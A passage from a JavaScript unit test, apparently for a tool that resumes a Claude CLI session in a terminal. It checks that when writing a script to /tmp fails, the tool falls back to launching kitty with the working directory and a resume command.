      spawns.push({ cmd, args });
      return true;
    },
    writeScript: async () => {
      throw new Error('read-only /tmp');
    },
    detect: async () => [
      { terminal: findTerminal('darwin', 'warp'), via: 'app', reason: 'installed', present: true },
      { terminal: findTerminal('darwin', 'kitty'), via: 'bin', reason: 'installed', present: true },
    ],
  });
  assert.equal(out.id, 'kitty');
  assert.deepEqual(spawns, [
    { cmd: 'kitty', args: ['--directory', MAC_CWD, 'claude', '--resume', ID] },
  ]);
});
